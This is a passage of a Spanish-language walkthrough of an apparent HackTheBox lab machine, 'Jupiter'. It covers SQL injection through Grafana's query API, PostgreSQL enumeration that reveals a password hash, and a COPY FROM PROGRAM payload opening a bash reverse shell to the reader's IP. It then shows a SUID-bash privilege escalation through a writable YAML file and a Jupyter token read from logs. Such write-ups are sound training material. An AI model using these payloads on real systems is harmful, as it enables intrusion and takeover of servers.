  </span><span class="nl">"datasource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"fieldConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"defaults"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"custom"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"align"</span><span class="p">:</span><span class="w"> </span><span class="s2">"auto"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"cellOptions"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"auto"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"inspect"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"mappings"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
      </span><span class="nl">"thresholds"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"absolute"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"steps"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"color"</span><span class="p">:</span><span class="w"> </span><span class="s2">"green"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
          </span><span class="p">},</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"color"</span><span class="p">:</span><span class="w"> </span><span class="s2">"red"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">]</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"color"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"thresholds"</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"overrides"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"gridPos"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"h"</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w">
    </span><span class="nl">"w"</span><span class="p">:</span><span class="w"> </span><span class="mi">12</span><span class="p">,</span><span class="w">
    </span><span class="nl">"x"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
    </span><span class="nl">"y"</span><span class="p">:</span><span class="w"> </span><span class="mi">15</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">24</span><span class="p">,</span><span class="w">
  </span><span class="nl">"options"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"showHeader"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
    </span><span class="nl">"cellHeight"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sm"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"footer"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"show"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"reducer"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"sum"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"countRows"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"fields"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"enablePagination"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"pluginVersion"</span><span class="p">:</span><span class="w"> </span><span class="s2">"9.5.2"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"targets"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"datasource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"editorMode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"code"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"format"</span><span class="p">:</span><span class="w"> </span><span class="s2">"table"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"hide"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"rawQuery"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
      </span><span class="nl">"rawSql"</span><span class="p">:</span><span class="w"> </span><span class="s2">"select </span><span class="se">\n</span><span class="s2">  name as </span><span class="se">\"</span><span class="s2">Name</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  parent as </span><span class="se">\"</span><span class="s2">Parent Planet</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  meaning as </span><span class="se">\"</span><span class="s2">Name Meaning</span><span class="se">\"</span><span class="s2"> </span><span class="se">\n</span><span class="s2">from </span><span class="se">\n</span><span class="s2">  moons </span><span class="se">\n</span><span class="s2">where </span><span class="se">\n</span><span class="s2">  parent = 'Saturn' </span><span class="se">\n</span><span class="s2">order by </span><span class="se">\n</span><span class="s2">  name desc;"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"refId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"sql"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"columns"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"function"</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">],</span><span class="w">
        </span><span class="nl">"groupBy"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"property"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
              </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"string"</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"groupBy"</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">],</span><span class="w">
        </span><span class="nl">"limit"</span><span class="p">:</span><span class="w"> </span><span class="mi">50</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Moons of Planet Saturn"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"transparent"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"table"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Podemos ver que como base de datos se esta usando <code class="language-plaintext highlighter-rouge">postgreSQL</code> y eso nos los dice en:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"datasource"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="w">
      </span><span class="p">}</span><span class="err">,</span><span class="w">
</span></code></pre></div></div>
<p>(si quieres investigar un poco mas de esto puedes ver la documentacion: <a href="https://grafana.com/docs/grafana/latest/datasources/postgres/">aqui</a>)</p>

<p>Y abajo podemos ver la consulta que se esta realizando:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"rawSql"</span><span class="p">:</span><span class="w"> </span><span class="s2">"select </span><span class="se">\n</span><span class="s2">  name as </span><span class="se">\"</span><span class="s2">Name</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  parent as </span><span class="se">\"</span><span class="s2">Parent Planet</span><span class="se">\"</span><span class="s2">, </span><span class="se">\n</span><span class="s2">  meaning as </span><span class="se">\"</span><span class="s2">Name Meaning</span><span class="se">\"</span><span class="s2"> </span><span class="se">\n</span><span class="s2">from </span><span class="se">\n</span><span class="s2">  moons </span><span class="se">\n</span><span class="s2">where </span><span class="se">\n</span><span class="s2">  parent = 'Saturn' </span><span class="se">\n</span><span class="s2">order by </span><span class="se">\n</span><span class="s2">  name desc;"</span><span class="err">,</span><span class="w">
</span></code></pre></div></div>
<p>Hasta ahora tenemos que usa grafana, postgreSQL, y que se hacen consultas a una base de datos para obtener la informacion de las lunas de los planetas.</p>

<p>Hace un momento habia mencionado que grafana tiene una API, pues esta es la <a href="https://grafana.com/docs/grafana/latest/developers/http_api/data_source/">Data source API</a>, vi vemos un poco la documentacion nos dice que si hacemos una peticion a <code class="language-plaintext highlighter-rouge">GET /api/datasources</code> obtendremos informacion de todas las fuentes de datos:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"YItSLg-Vz"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"orgId"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PostgreSQL"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"typeName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PostgreSQL"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"typeLogoUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"public/app/plugins/datasource/postgres/img/postgresql_logo.svg"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"access"</span><span class="p">:</span><span class="w"> </span><span class="s2">"proxy"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"localhost:5432"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"grafana_viewer"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"database"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
    </span><span class="nl">"basicAuth"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
    </span><span class="nl">"isDefault"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
    </span><span class="nl">"jsonData"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"database"</span><span class="p">:</span><span class="w"> </span><span class="s2">"moon_namesdb"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"sslmode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"disable"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"readOnly"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>Y ahora confirmamos que la base de datos es una PostgreSQL como lo dice en <code class="language-plaintext highlighter-rouge">"name": "PostgreSQL",</code>, ademas de que la base de datos es <code class="language-plaintext highlighter-rouge">moon_namesdb</code> como lo dice en <code class="language-plaintext highlighter-rouge">database": "moon_namesdb"</code>, ahora debemos de encontrar la forma de realizar consultar a la base de datos para ver si existen un posible SQLi, si seguimos viendo la documentacion de la API, encontraremos que a tra vez de la ruta <code class="language-plaintext highlighter-rouge">/api/ds/query</code> podemos realizar peticiones por POST y realizar consultas a la base da datos.</p>

<p>Si intentamos acceder mediante la URL: <code class="language-plaintext highlighter-rouge">http://kiosk.jupiter.htb/api/ds/query</code>, no vamos a poder, afortunadamente BurpSuite en el apartado de proxy tiene una opcion la cual permite ver todo el historial HTTP, vean que si nos regresamos al dashboard y le damos en inspeccionar en panel JSON, tenemos que en el historial HTTP se esta accediendo a <code class="language-plaintext highlighter-rouge">/api/ds/query</code>:</p>

<p><img src="/assets/img/jupiter/3.png" alt="" /></p>

<p>Si mandamos esto al repeater, podemos ver la consulta que se esta haciendo</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Jupiter';",
</code></pre></div></div>

<p>Asi que toca probar SQLi</p>

<h2 id="sql-injection">SQL injection</h2>

<p>Si mostramos el nombre de la base de datos:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">current_database</span><span class="p">()</span>
</code></pre></div></div>
<p>Podemos ver que nos reporta la base de datos que esta en uso:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"data"</span><span class="p">:{</span><span class="w">
    </span><span class="nl">"values"</span><span class="p">:[</span><span class="w">
        </span><span class="p">[</span><span class="w">
            </span><span class="s2">"moon_namesdb"</span><span class="w">
        </span><span class="p">]</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p><strong>Ojo:</strong> Ahora empezare a enumerar la base de datos haciedo uso de <code class="language-plaintext highlighter-rouge">pg_catalog</code> la cual es similar a <code class="language-plaintext highlighter-rouge">information_schema</code>, ya que esta contiene informacion de las bases de datos, esto no es necesario ya que no encontraremos nada que nos sirva, solo lo hago por que se me hace interesante.</p>

<h3 id="enumeracion-de-la-db">Enumeracion de la DB</h3>

<p>Como sabemos que se esta haciendo uso de <code class="language-plaintext highlighter-rouge">postgreSQL</code> podemos usar <code class="language-plaintext highlighter-rouge">pg_catalog</code> para enumerar la base de datos, usando <code class="language-plaintext highlighter-rouge">SELECT * FROM pg_catalog.pg_database;</code> mostraremos todas las base de datos existentes, con <code class="language-plaintext highlighter-rouge">pg_catalog.pg_database</code> le estamos diciendo que de <code class="language-plaintext highlighter-rouge">pg_catalog</code> muestre las bases de datos, y eso lo indicamos con <code class="language-plaintext highlighter-rouge">pg_database</code>, el resultado son todas las bases de datos existentes</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
    </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"moon_namesdb"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"template1"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"template0"</span><span class="w">
</span><span class="p">]</span><span class="err">,</span><span class="w">
</span></code></pre></div></div>
<p>Vemos que la base de datos que nos interesa es la <code class="language-plaintext highlighter-rouge">moon_namesdb</code>, asi que ahora empezaremos a enumerar las tablas de esta base da datos, ten en cuenta que no es necesario usar un <code class="language-plaintext highlighter-rouge">WHERE</code> para indicarle la base datos que queremos enumerar por que <code class="language-plaintext highlighter-rouge">moon_namesdb</code> ya esta en uso, asi que las consultas se harian usando esa base de datos, usando de</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT tablename FROM pg_catalog.pg_tables;
</code></pre></div></div>

<p>Obtendremos todas las tablas, en este caso le indicamos con el SELECT que obtenga la columna llamada <code class="language-plaintext highlighter-rouge">tablename</code> de <code class="language-plaintext highlighter-rouge">pg_tables</code> la cual tiene todas las tablas de la base de datos <code class="language-plaintext highlighter-rouge">moon_namesdb</code>, podemos observar dos tablas interesantes: <code class="language-plaintext highlighter-rouge">pg_user_mapping</code> y <code class="language-plaintext highlighter-rouge">pg_shadow</code>, si mostramos todos los datos usando <code class="language-plaintext highlighter-rouge">SELECT * FROM pg_shadow</code> nos mostrara eso:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"values"</span><span class="p">:[</span><span class="w">
    </span><span class="p">[</span><span class="w">
        </span><span class="s2">"postgres"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"grafana_viewer"</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="p">[</span><span class="w">
        </span><span class="s2">"10"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"16385"</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="p">[</span><span class="w">
        </span><span class="kc">null</span><span class="p">,</span><span class="w">
        </span><span class="s2">"SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY="</span><span class="w">
    </span><span class="p">],</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>Parace ser el hash de una contraseña, que no podemos crackear, y si mostramos los datos de <code class="language-plaintext highlighter-rouge">pg_user_mapping</code> no saldra nada, asi que es posible que debamos de hacer otra cosa, intentaremos realizar un RCE para mandarnos una reverse shell, guiandonos de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution">aqui</a> usaremos este consulta para conseguir RCE:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span> <span class="nb">text</span><span class="p">);</span> <span class="k">COPY</span> <span class="n">cmd_exec</span> <span class="k">FROM</span> <span class="n">PROGRAM</span> <span class="s1">'bash -c </span><span class="se">\"</span><span class="s1">bash -i &gt;&amp; /dev/tcp/&lt;tu ip&gt;/443 0&gt;&amp;1</span><span class="se">\"</span><span class="s1">'</span><span class="p">;</span>
</code></pre></div></div>
<ul>
  <li>
    <p>Con <code class="language-plaintext highlighter-rouge">CREATE TABLE cmd_exec(cmd_output text)</code> le estamos diciendo que cree una tabla llamada <code class="language-plaintext highlighter-rouge">cmd_exec</code> en la cual tendra una columna llamada <code class="language-plaintext highlighter-rouge">cmd_output</code> de tipo <code class="language-plaintext highlighter-rouge">text</code>, la cual tendra el resultado del comando ejecutado</p>
  </li>
  <li>
    <p>Despues con <code class="language-plaintext highlighter-rouge">COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;tu ip&gt;/443 0&gt;&amp;1\"'</code> le estamos diciendo que copie datos a la tabla <code class="language-plaintext highlighter-rouge">cmd_exec</code> ademas de que con <code class="language-plaintext highlighter-rouge">PROGRAM</code> estamos haciendo el llamado de un programa externo el cual es <code class="language-plaintext highlighter-rouge">bash</code> y ejecutara la reverse shell</p>
  </li>
</ul>

<p>Y ya conseguimos una reverse shell</p>

<h2 id="movimiento-lateral-de-postgres-a-juno">Movimiento lateral de postgres a Juno</h2>

<p>Empezaremos analizando los procesos que esten ejecutandose en la maquina, asi que ejecutare pspy y encontraremos que se esta ejecutando un script desde el usuario Juno</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>21104  | /bin/bash /home/juno/shadow-simulation.sh
</code></pre></div></div>

<p>Ademas tambien veremos que esta copiando el archivo <code class="language-plaintext highlighter-rouge">network-simulation.yml</code> a <code class="language-plaintext highlighter-rouge">/dev/shm</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> <span class="nt">-a</span> /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
</code></pre></div></div>

<p>Si vemos el contenido del archivo tenemos esto:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">general</span><span class="pi">:</span>
  <span class="c1"># stop after 10 simulated seconds</span>
  <span class="na">stop_time</span><span class="pi">:</span> <span class="s">10s</span>
  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
  <span class="c1"># time when running non-blocking system calls</span>
  <span class="na">model_unblocked_syscall_latency</span><span class="pi">:</span> <span class="kc">true</span>

<span class="na">network</span><span class="pi">:</span>
  <span class="na">graph</span><span class="pi">:</span>
    <span class="c1"># use a built-in network graph containing</span>
    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
    <span class="na">type</span><span class="pi">:</span> <span class="s">1_gbit_switch</span>

<span class="na">hosts</span><span class="pi">:</span>
  <span class="c1"># a host with the hostname 'server'</span>
  <span class="na">server</span><span class="pi">:</span>
    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/python3</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">-m http.server </span><span class="m">80</span>
      <span class="na">start_time</span><span class="pi">:</span> <span class="s">3s</span>
  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
  <span class="na">client</span><span class="pi">:</span>
    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
    <span class="na">quantity</span><span class="pi">:</span> <span class="m">3</span>
    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/curl</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">-s server</span>
      <span class="na">start_time</span><span class="pi">:</span> <span class="s">5s</span>
</code></pre></div></div>

<p>Si analizamos un poco, vemos que se esta implementando un servidor y un cliente, de lado del servidor se esta ejecutando un comando de python el cual iniciar un servidor http:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/python3</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">-m http.server </span><span class="m">80</span>
</code></pre></div></div>

<p>Y del lado del cliente se esta haciendo una peticion a ese servidor creado:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/curl</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">-s server</span>
</code></pre></div></div>

<p>Como tenemos permisos de escritura en el archivo, entonces podemos decirle que ejecute cualquier otro comando, lo mas sencillo es darle permisos SUID a bash para que nosotros tengamos una shell como Juno, editaremos el archivo yaml de esta manera:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">general</span><span class="pi">:</span>
  <span class="c1"># stop after 10 simulated seconds</span>
  <span class="na">stop_time</span><span class="pi">:</span> <span class="s">10s</span>
  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
  <span class="c1"># time when running non-blocking system calls</span>
  <span class="na">model_unblocked_syscall_latency</span><span class="pi">:</span> <span class="kc">true</span>

<span class="na">network</span><span class="pi">:</span>
  <span class="na">graph</span><span class="pi">:</span>
    <span class="c1"># use a built-in network graph containing</span>
    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
    <span class="na">type</span><span class="pi">:</span> <span class="s">1_gbit_switch</span>

<span class="na">hosts</span><span class="pi">:</span>
  <span class="c1"># a host with the hostname 'server'</span>
  <span class="na">server</span><span class="pi">:</span>
    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/cp</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">/bin/bash /tmp/bash</span>
      <span class="na">start_time</span><span class="pi">:</span> <span class="s">3s</span>
  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
  <span class="na">client</span><span class="pi">:</span>
    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
    <span class="na">quantity</span><span class="pi">:</span> <span class="m">3</span>
    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/chmod</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">u+s /tmp/bash</span>
      <span class="na">start_time</span><span class="pi">:</span> <span class="s">5s</span>
</code></pre></div></div>
<p>Y depues de unos segundos en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code> tendremos el binario bash con permisos SUID, solo ejecutamos y ya somos Juno, ah este punto ya tenemos la flag de user</p>

<h2 id="movimiento-lateral-de-juno-a-jovian">Movimiento lateral de Juno a Jovian</h2>

<p>Si vemos a que grupos pertenece Juno, podemos ver que existe en el Science:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
</code></pre></div></div>

<p>Si buscamos por acrhivos que pertenescan a ese grupo, encontramos varios de Jupyter</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -type f -group science 2&gt; /dev/null
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/solar-flares/flares.csv
/opt/solar-flares/xflares.csv
/opt/solar-flares/map.jpg
/opt/solar-flares/start.sh
/opt/solar-flares/logs/jupyter-2023-03-10-25.log
/opt/solar-flares/logs/jupyter-2023-03-08-37.log
/opt/solar-flares/logs/jupyter-2023-03-08-38.log
/opt/solar-flares/logs/jupyter-2023-03-08-36.log
/opt/solar-flares/logs/jupyter-2023-03-09-11.log
/opt/solar-flares/logs/jupyter-2023-03-09-24.log
/opt/solar-flares/logs/jupyter-2023-03-08-14.log
/opt/solar-flares/logs/jupyter-2023-03-09-59.log
/opt/solar-flares/flares.html
/opt/solar-flares/cflares.csv
/opt/solar-flares/flares.ipynb
/opt/solar-flares/mflares.csv
</code></pre></div></div>

<p>Si vemos uno de los logs vamos a poder ver unos token:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /opt/solar-flares/logs/jupyter-2023-03-08-37.log
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To access the notebook, open this file in a browser:
  file:///home/jovian/.local/share/jupyter/runtime/nbserver-1388-open.html
Or copy and paste one of these URLs:
  http://localhost:8889/?token=5313d7bfe0eb674db299f627f4be1212d17c6758b7b98989
</code></pre></div></div>
<p>Asi que es posible que ocupemos ese token para acceder a Jupyter</p>

<p>Y un poco mas arriba del mismo log nos dice que el puerto 8888 esta ocupado:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[I 11:37:49.348 NotebookApp] The port 8888 is already in use, trying another port.
[I 11:37:49.349 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
</code></pre></div></div>

<p>Eso lo podemos comprobar por que si mostramos los puertos abiertos, el 8888 esta ocupado:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44097         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33637         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:54143         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:56017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -  &lt;--- Este                 
